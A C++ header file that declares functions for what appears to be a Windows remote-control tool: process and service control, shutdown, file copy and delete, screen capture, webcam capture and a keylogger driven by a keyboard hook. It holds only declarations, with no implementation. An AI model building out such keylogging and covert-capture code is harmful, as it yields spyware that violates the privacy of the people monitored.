#ifndef UTILS_H
#define UTILS_H

#include <map>
#include <vector>
#include <string>
#include <thread>
#include <atomic>
#include <iomanip>
#include <iostream>
#include <fstream>
#include <functional>
#include <filesystem>
#include <windows.h>
#include <tlhelp32.h>
#include <opencv2/opencv.hpp>

using namespace std;
using namespace cv;

extern VideoCapture* cap;
extern HHOOK hHook;
extern atomic<bool> keepKeyloggerRunning;
extern ofstream f;

map<string, map<string, function<void()>>> setupHandlers();
void listProcesses();
void startApp(wchar_t* appPath);
void stopApp(DWORD processID);
void listServices();
void startServiceByName(LPCWSTR serviceName);
void stopServiceByName(LPCWSTR serviceName);
void shutdownMachine();
void restartMachine();
void copyFile(LPCWSTR src, LPCWSTR dest);
void deleteFile(LPCWSTR filePath);
void captureScreen(string outputPath);
void startKeylogger();
void stopKeylogger();
void startCamera();
void stopCamera();
bool enableShutdownPrivilege();

#endif